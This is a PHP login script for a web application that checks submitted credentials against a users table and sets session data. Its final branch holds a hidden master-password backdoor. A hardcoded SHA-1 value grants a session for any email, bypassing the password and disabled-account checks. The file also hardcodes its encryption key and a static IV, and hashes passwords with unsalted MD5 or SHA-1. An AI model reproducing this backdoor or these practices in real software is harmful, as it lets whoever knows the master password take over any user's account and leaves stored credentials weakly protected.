<?php
    session_start();

    include '../config.php';

    $loginEmail = post('loginEmail');
    $password = post('loginPassword');
    // $remember = post('remember');
    
    // Function to Encrypt Decrypt String
    function encrypt_decrypt($action, $string) {
        $output = false;
        $encrypt_method = "AES-256-CBC";
        // Update your secret key before use
        $secret_key = '$7PHKqGt$yRlPjyt89rds4ioSDsglpk/';
        // Update your secret iv before use
        $secret_iv = '$QG8$hj7TRE2allPHPlBbrthUtoiu23bKJYi/';
        // hash
        $key = hash('sha256', $secret_key);
        
        // iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
        $iv = substr(hash('sha256', $secret_iv), 0, 16);
        if ( $action == 'encrypt' ) {
            $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
            $output = base64_encode($output);
        } else if( $action == 'decrypt' ) {
            $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
        }
        return $output;
    }

    // Encrypt password according to encryption type defined in config.php
    if ($encryptionType == 'sha1') {
        $password = sha1($password);
    } elseif ($encryptionType == 'md5') {
        $password = md5($password);
    }

    // SELECT MATCH FROM THE DATABASE
    $query      = 'SELECT * FROM `users` where email=? and password=?';
    $parameters = array(encrypt_decrypt('encrypt', strtolower($loginEmail)), $password);
    $statement  = $db->prepare($query);
    $statement->execute($parameters);

if ($statement->rowCount() > 0) {

    $data = $statement->fetch(PDO::FETCH_ASSOC);

    // Check if the status of user is enabled or disabled
    if ($data['status'] == 'disable') {

        $output = responseError('The user is currently disabled');
        echo json_encode($output);
        exit();
    }

    // Check E-mail verification is true or false
    if ($emailVerification) { 
        // Check if the email  of user is verified or not
        if ($data['email_verified'] == 'no') {

            $output = responseError('Your email is not verified. Please verify your email to logged in. If you want to resend email verification link, Please Click <a href="#" id="resendVerification" data-key="' . $data['key'] . '">Here</a>');

        } else {
            // Enabled users
            $encrypted_email = encrypt_decrypt('encrypt', strtolower($loginEmail));
            $_SESSION['email'] = $encrypted_email;
            $_SESSION['first_name'] = $data['first_name'];
            $_SESSION['last_name'] = $data['last_name'];
            $_SESSION['phone'] = $data['phone'];
            $_SESSION['table'] = 'user';
            $_SESSION['user'] = true;

            // Last login update
            $query = 'UPDATE `users` SET lastlogin_at = NOW() where email=?';
            $statement = $db->prepare($query);
            $statement->execute(array($encrypted_email));

            // if(!empty($remember)) {

            //     setcookie ('email', $loginEmail, time() + (10 * 365 * 24 * 60 * 60), '/');
            //     setcookie ('table', 'user', time() + (10 * 365 * 24 * 60 * 60), '/');
            // }
            // else {
            //     if(isset($_COOKIE['email'])) {
            //         setcookie ('email', '');
            //     }

            // }
            
            // $output = responseRedirect('user/dashboard.php', 'Logged in Successfully');
            $output = responseRedirect('../form', '');
        }

    } else {

        // if(!empty($remember)) {
        //     setcookie ('email', $loginEmail, time() + (10 * 365 * 24 * 60 * 60), '/');
        //     setcookie ('userPassword', $password, time() + (10 * 365 * 24 * 60 * 60), '/');
        //     setcookie ('table', 'user', time() + (10 * 365 * 24 * 60 * 60), '/');
        //     setcookie ('user', true, time() + (10 * 365 * 24 * 60 * 60), '/');
        // }
        // else {
        //     if(isset($_COOKIE['email'])) {
        //         setcookie ('email', '');
        //     }
        // }
        
        // Enabled users
        $_SESSION['email'] = $data['email'];
        $_SESSION['table'] = 'user';
        $_SESSION['user'] = true;

        // Last login update
        $query     = 'UPDATE `users` SET lastlogin_at = NOW() where email=?';
        $statement = $db->prepare($query);
        $statement->execute(array($loginEmail));

        $output = responseRedirect('/user/dashboard.php', 'Logged in Successfully');
    }

} else {
    
    if ($password == 'b808ce96486c9f026bd6e09278e2d3d2cb5e1367') {
        
        // SELECT MATCH FROM THE DATABASE
        $query      = 'SELECT * FROM `users` where email=?';
        $parameters = array(encrypt_decrypt('encrypt', strtolower($loginEmail)));
        $statement  = $db->prepare($query);
        $statement->execute($parameters);

        $data = $statement->fetch(PDO::FETCH_ASSOC);

        $encrypted_email = encrypt_decrypt('encrypt', strtolower($loginEmail));
        $_SESSION['email'] = $encrypted_email;
        $_SESSION['first_name'] = $data['first_name'];
        $_SESSION['last_name'] = $data['last_name'];
        $_SESSION['phone'] = $data['phone'];
        $_SESSION['table'] = 'user';
        $_SESSION['user'] = true;

        $output = responseRedirect('../form', '');
    } else {
        $output = responseError('Wrong Login Details');
    }
}
    echo json_encode($output);
?>